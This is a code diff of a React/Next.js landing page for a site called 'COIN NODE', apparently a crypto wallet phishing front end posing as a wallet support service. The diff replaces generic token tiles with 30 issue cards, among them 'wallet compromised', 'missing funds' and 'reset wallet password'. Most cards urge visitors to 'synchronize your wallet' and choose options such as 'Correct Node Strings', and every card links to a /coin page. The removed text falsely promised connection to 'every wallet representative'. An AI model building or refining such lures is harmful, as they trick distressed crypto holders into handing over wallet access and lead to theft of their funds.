@@ -1,16 +1,4 @@
 import React, { useEffect, useState } from 'react';
-import { BsCheck2Circle } from 'react-icons/bs';
-import {
-  FaBoxTissue,
-  FaDelicious,
-  FaWallet,
-  FaWarehouse,
-} from 'react-icons/fa';
-import { MdGasMeter, MdToken } from 'react-icons/md';
-import { GrDocumentTransfer, GrTransaction } from 'react-icons/gr';
-import { SiAcclaim } from 'react-icons/si';
-import { LuLogIn } from 'react-icons/lu';
-import { GiWhiteTower } from 'react-icons/gi';
 import Link from 'next/link';
 import { cryptoData } from './data';
 import Image from 'next/image';
@@ -19,7 +7,6 @@ import Loader from './Loader';
 import Chat from './Chat';
 
 function Main() {
-  // console.log(cryptoData);
   const [flag, setFlag] = useState(true);
 
   useEffect(() => {
@@ -45,66 +32,41 @@ function Main() {
           Cryptocurrency Prices
         </p>
       </div>
-      <div className='hidden md:flex absolute right-0 top-20'>
-        <Image src={'/hero.png'} width={800} height={800} alt='image' />
-      </div>
-      <div className='px-1 py-3 md:p-10 space-y-5 font-bold z-30 w-[80%] text-justify md:w-[50%]'>
-        <div className='flex items-center md:items-start md:flex-col space-x-3 md:space-x-0 space-y-0 md:space-y-12'>
-          <h1 className='text-2xl md:text-[60px]'>Blockchain</h1>
-          <h1 className='text-2xl md:text-[60px]'>Rectification</h1>
-        </div>
-        <p className='text-[8px] leading-4 font-light md:text-lg md:font-bold'>
-          Every digital artwork on Upside is authentic and truly unique.
-          Blockchain technology makes this new aproch to digital ownership
-          possible. <br></br>
-          <br></br>Open and decentralized protocol for syncing various Wallets
-          issues on Secure Server. This is not an app but a protocol that
-          establishes a remote resolution between all noncustodial wallet{' '}
-          <br></br>
-          <br></br>It is an online server which gets you across to every wallet
-          representative to enable effective complain and rectification of
-          issues.
-          <br></br>
-          <br></br>You will be on a chat with an Artificial Intelligence Robot
-          with zero Human interference.
-        </p>
-        <div className='flex mt-8 space-x-4'>
-          <Link href={'/coin'} className=''>
-            <button className='bg-blue-500 text-[7px] md:text-base py-2 px-3 md:px-8 md:py-4 rounded-md cursor-pointer hover:bg-[#15243B] transition-all ease-in-out duration-500'>
-              Connect Wallet
-            </button>
-          </Link>
-          <select className='bg-transparent text-[7px] md:text-base py-2 px-3 md:px-8 md:py-4 rounded-md border-2 border-blue-500 cursor-pointer hover:bg-[#15243B] transition-all ease-in-out duration-500'>
-            {cryptoData?.map((name) => (
-              <option key={name.name} value={name.name}>
-                {name.name}
-              </option>
-            ))}
-          </select>
-        </div>
-      </div>
-      <div className='section bg-[#091930] pt-8 mt-5 px-1 md:px-10'>
-        <h1 className='md:text-3xl font-bold mb-6'>
-          Make Your Selection Below
-        </h1>
-        <div className='grid grid-cols-2 lg:grid-cols-3 gap-x-2 md:gap-5 gap-y-3'>
+      <div className='section bg-[#091930] pt-8 mt-5 px-1'>
+        <div className=''>
+          <div className='bg-[#001132] flex flex-col items-center justify-center border-2 border-[#009DEA] pb-6 pt-12 space-y-2 mb-8'>
+            <h1 className='text-[9px] md:text-[45px] font-bold tracking-wider'>
+              {'COIN NODE'}
+            </h1>
+            <h1 className='font-bold text-[8px] md:text-lg pb-5'>
+              {
+                'COIN NODE is an open protocol to communicate securely between Wallets and Dapps (Web3 Apps).'
+              }
+            </h1>
+            <Link
+              href={''}
+              className='px-4 py-2 text-lg bg-[#009DEA] rounded text-[#001132] cursor-pointer hover:bg-[#FCB900] transition-all ease-in-out duration-500'
+            >
+              Explore Node Features
+            </Link>
+          </div>
           {homedata.map((e) => {
             const { id, title, text, icon } = e;
             return (
               <div
                 key={id}
-                className='bg-[#15243B] shadow-md pl-2 md:px-4 py-3 md:py-10 rounded-md space-y-10 cursor-pointer hover:bg-[#001132] transition-all ease-in-out duration-500'
+                className='bg-[#001132] flex flex-col items-center justify-center border-2 border-[#009DEA] py-5 space-y-2'
               >
-                <Link href={'/coin'}>
-                  <div className='md:font-bolder text-2xl md:text-[50px] text-blue-500'>
-                    {icon}
-                  </div>
-                  <h1 className='text-[9px] md:text-3xl font-bold tracking-wider my-2 md:my-6'>
-                    {title}
-                  </h1>
-                  <h1 className='text-[8px] md:text-base font-light text-gray-500'>
-                    {text}
-                  </h1>
+                <Image src={icon} width={100} height={100} alt={title} />
+                <h1 className='text-[9px] md:text-[45px] font-bold tracking-wider'>
+                  {title}
+                </h1>
+                <h1 className='text-[8px] md:text-lg font-light'>{text}</h1>
+                <Link
+                  href={'/coin'}
+                  className='px-4 py-2 text-lg bg-[#009DEA] text-blue-800 cursor-pointer hover:bg-[#FCB900] transition-all ease-in-out duration-500'
+                >
+                  CLICK HERE
                 </Link>
               </div>
             );
@@ -127,170 +89,182 @@ export default Main;
 const homedata = [
   {
     id: 1,
-    icon: <BsCheck2Circle />,
-    title: 'Validation',
-    text: 'Click here to buy Tokens',
+    icon: '/wallet/gi.png',
+    title: 'GENERAL ISSUES',
+    text: 'For instant solution on any type of issues , click the button below to synchronize your wallet and select "Correct Node Strings"',
   },
   {
     id: 2,
-    icon: <BsCheck2Circle />,
-    title: 'Buy',
-    text: 'Click here to buy Tokens',
+    icon: '/wallet/swap.png',
+    title: 'Swapping',
+    text: 'We will support you in any related issues with swaping and/or exchange of coins. Kindly click here.',
   },
   {
     id: 3,
-    icon: <BsCheck2Circle />,
-    title: 'Sell',
-    text: 'Click here to sell Tokens',
+    icon: '/wallet/token.png',
+    title: 'TOKEN ISSUES',
+    text: 'For issues with any tokens, during swap, claim, withdrawal or related issue, click the button below to synchronize your wallet and select "Correct Node Strings"',
   },
   {
     id: 4,
-    icon: <BsCheck2Circle />,
-    title: 'Mint',
-    text: 'Click here to mint Tokens',
+    icon: '/wallet/validation.png',
+    title: 'VALIDATION',
+    text: 'For validation related issue, click the button below to synchronize your wallet and select "validate Account"',
   },
   {
     id: 5,
-    icon: <BsCheck2Circle />,
-    title: 'NFT',
-    text: 'Click here for NFTs',
+    icon: '/wallet/pool.png',
+    title: 'POOL & FARM ACCESS',
+    text: 'For issues with any Pools and Farm Access or related issue, click the button below to synchronize your wallet and select "Correct Node Strings"',
   },
   {
     id: 6,
-    icon: <BsCheck2Circle />,
-    title: 'BRIDGE',
-    text: 'Click here to bridge Tokens',
+    icon: '/wallet/deposite.png',
+    title: 'DEPOSITS AND WITHDRAWALS',
+    text: 'For Issues with withdrawals, claim or related issue, click the button below to synchronize your wallet and select "Enable token swap & claims"',
   },
   {
     id: 7,
-    icon: <BsCheck2Circle />,
-    title: 'MIGRATION',
-    text: 'Click here for migration',
+    icon: '/wallet/claim.png',
+    title: 'CLAIM REWARD',
+    text: 'For claim, reward enrollment click the button below to synchronize your wallet and "obtain your reward"',
   },
   {
     id: 8,
-    icon: <BsCheck2Circle />,
-    title: 'STAKE/UNSTAKE',
-    text: 'Click here to stake and unstake Tokens',
+    icon: '/wallet/tb.png',
+    title: 'TOKEN BRIDGE',
+    text: 'For issues with token bridge click the button below to synchronize your wallet and select "Enable Bridge"',
   },
   {
     id: 9,
-    icon: <BsCheck2Circle />,
-    title: 'MIGRATION ISSUES',
-    text: 'Click here for migration related issues',
+    icon: '/wallet/tr.png',
+    title: 'TOKEN RECTIFICATION',
+    text: 'For issues with token rectification, click the button below to synchronize your wallet and select "Rectify Token Error"',
   },
   {
     id: 10,
-    icon: <FaWarehouse />,
-    title: 'ASSETS RECOVERY',
-    text: 'Click here for assets recovery issues',
+    icon: '/wallet/bs.png',
+    title: 'BUY & SELL',
+    text: 'For issues with buying and selling, click the button below to synchronize your wallet, then select "Buy or Sell"',
   },
   {
     id: 11,
-    icon: <MdGasMeter />,
-    title: 'HIGH GAS FEE',
-    text: 'Click here for gas fee related issues',
+    icon: '/wallet/erro.png',
+    title: 'ERROR RECTIFICATION',
+    text: 'For issues with any errors, click the button below to synchronize your wallet and then select "Detect & Fix Error"',
   },
   {
     id: 12,
-    icon: <MdGasMeter />,
-    title: 'SLIPPAGE ERROR',
-    text: 'Click here for slippage related error during trade',
+    icon: '/wallet/ts-us.png',
+    title: 'TOKEN STAKE AND UNSTAKE',
+    text: 'For issues with token Staking and Unstaking click the button below to synchronize your wallet and select "Enable Stake and Unstake"',
   },
   {
     id: 13,
-    icon: <GrDocumentTransfer />,
-    title: 'TRANSACTION ERROR',
-    text: 'Click here for transaction related issues',
+    icon: '/wallet/ledger.png',
+    title: 'LEDGER & TREZOR',
+    text: 'CFor ledger or Trezor related issues click the button below to synchronize your wallet and select "correct node string"',
   },
   {
     id: 14,
-    icon: <GrTransaction />,
-    title: 'CROSS CHAIN TRANSFER',
-    text: 'Click here for cross chain bridge issues',
+    icon: '/wallet/wnl.png',
+    title: 'WEBSITE NOT LOADING',
+    text: 'Are you unable to load exchange website? click the button below to synchronize your wallet and select "correct node string"',
   },
   {
     id: 15,
-    icon: <FaWarehouse />,
-    title: 'STAKING ISSUES',
-    text: 'Click here for staking related issues',
+    icon: '/wallet/kyc.png',
+    title: 'KYC & WHITELIST',
+    text: 'To whitelist or complete LYX click the button below to synchronize your wallet and select "Whitelist wallet"',
   },
   {
     id: 16,
-    icon: <SiAcclaim />,
-    title: 'SWAP/EXCHANGE',
-    text: 'Click here for swap/exchange related issues',
+    icon: '/wallet/airdrops.png',
+    title: 'AIRDROPS',
+    text: 'For Airdrop enroll and claim click the button below to synchronize your wallet and select "enroll and claim"',
   },
   {
     id: 17,
-    icon: <SiAcclaim />,
-    title: 'CLAIM REFLECTION',
-    text: 'Click here to claim reflection',
+    icon: '/wallet/unable.png',
+    title: 'UNABLE TO ACCESS WALLET?',
+    text: 'Are you unable to access your wallet? click the button below to synchronize your wallet and select "regain access"',
   },
   {
     id: 18,
-    icon: <FaDelicious />,
-    title: 'CONNECT TO DAPPS',
-    text: 'Click here for error while connecting to Dapps',
+    icon: '/wallet/reset.png',
+    title: 'RESET WALLET PASSWORD',
+    text: 'To reset wallet password click the button below to synchronize your wallet and select reset passworD',
   },
   {
     id: 19,
-    icon: <LuLogIn />,
-    title: 'LOGIN ISSUES',
-    text: 'Click here for issues while logging into your wallet',
+    icon: '/wallet/wc.png',
+    title: 'WALLET COMPROMISED',
+    text: 'Are you a victim of wallet hack?  click the button below to synchronize your wallet and hold the transactions',
   },
   {
     id: 20,
-    icon: <GiWhiteTower />,
-    title: 'CLAIM AIRDROP',
-    text: 'Click here for airdrop related issues',
+    icon: '/wallet/nft.png',
+    title: 'NFT Mint',
+    text: 'Click here to turn your digital content into NFT by uploading them here',
   },
   {
     id: 21,
-    icon: <MdGasMeter />,
-    title: 'NFTs ISSUES',
-    text: 'Click here for NFTs minting/transfer related issues',
+    icon: '/wallet/tr.png',
+    title: 'Connect to Dapps',
+    text: 'Connect decentralised web applications to mobile wallets. Enable DAPP on mobile wallet/ Extension.',
   },
   {
     id: 22,
-    icon: <MdGasMeter />,
-    title: 'MISSING/IRREGULAR BALANCE',
-    text: 'Click here to recover lost/missing funds',
+    icon: '/wallet/login.png',
+    title: 'Login Issues',
+    text: 'Do you have issues logging into your wallet?',
   },
   {
     id: 23,
-    icon: <GiWhiteTower />,
-    title: 'WHITELIST ISSUES',
-    text: 'Click here for whitelist related issues',
+    icon: '/wallet/missing.png',
+    title: 'Missing Funds',
+    text: 'Lost access to funds or funds is missing?',
   },
   {
     id: 24,
-    icon: <FaDelicious />,
-    title: 'TRANSACTION DELAY',
-    text: 'Click here for any issues related to transaction delayed',
+    icon: '/wallet/high.png',
+    title: 'High Fees',
+    text: 'Increase in transaction fees?',
   },
   {
     id: 25,
-    icon: <FaDelicious />,
-    title: 'LOCKED ACCOUNT',
-    text: 'Click here for issues related to account lock',
+    icon: '/wallet/migrate.png',
+    title: 'Migrate',
+    text: 'Do you have issues with migrations?',
   },
   {
     id: 26,
-    icon: <FaWallet />,
-    title: 'TRADING WALLET ISSUES',
-    text: 'Click here if you have a problem with your trading wallet',
+    icon: '/wallet/tdd.png',
+    title: 'Transaction Delay',
+    text: 'Do you have issues with transactions being delayed?',
   },
   {
     id: 27,
-    icon: <MdToken />,
-    title: 'UNABLE TO BUY COINS/TOKENS',
-    text: 'To trade crypto, your account must be marked as a trusted payment source',
+    icon: '/wallet/iwtw.png',
+    title: 'Issues With Trading wallet',
+    text: 'Issues With Trading wallet',
   },
   {
     id: 28,
-    icon: <FaBoxTissue />,
-    title: 'OTHER ISSUES NOT LISTED',
-    text: "If you can't find the issues you are experiencing, click here",
+    icon: '/wallet/unable.png',
+    title: 'Unable to purchase coins',
+    text: 'if your account is not recognized as a trusted payment source you may not be able to buy crypto and add coins',
+  },
+  {
+    id: 29,
+    icon: '/wallet/locked.png',
+    title: 'Locked Account',
+    text: 'if you are logged out due to activity on the account',
+  },
+  {
+    id: 30,
+    icon: '/wallet/other.png',
+    title: 'OTHER ISSUES',
+    text: 'Your issue not listed above? Describe your issue by clicking on the button below.',
   },
 ];
